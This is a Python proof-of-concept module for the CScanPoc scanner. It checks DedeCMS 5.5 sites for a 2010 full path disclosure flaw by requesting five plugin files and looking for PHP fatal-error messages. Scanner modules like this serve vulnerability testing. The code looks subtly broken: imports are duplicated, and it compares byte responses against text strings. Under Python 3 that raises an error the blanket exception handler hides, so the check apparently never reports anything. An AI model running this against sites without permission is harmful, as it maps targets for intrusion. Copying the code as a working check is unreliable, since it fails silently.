# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCms_0012'  # 平台漏洞编号，留空
    name = '织梦CMS full Path Disclosure'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2010-04-26'  # 漏洞公布时间
    desc = '''
        DedeCMS v5.5 full Path Disclosure Vulnerability.
    '''  # 漏洞描述
    ref = 'http://www.myhack58.com/Article/html/3/62/2010/26804.htm'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '760d1bb0-148f-45e4-928e-b1754cd27640'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            file_list = ['/plus/paycenter/alipay/return_url.php',
                         '/plus/paycenter/cbpayment/autoreceive.php',
                         '/plus/paycenter/nps/config_pay_nps.php',
                         '/plus/task/dede-maketimehtml.php',
                         '/plus/task/dede-optimize-table.php', ]

            for filename in file_list:
                verify_url = '{target}'.format(target=self.target)+filename
                req = urllib.request.urlopen(verify_url)
                content = req.read()
                if '<b>Fatal error</b>:' in content and '.php</b>' in content:
                    if 'on line <b>' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
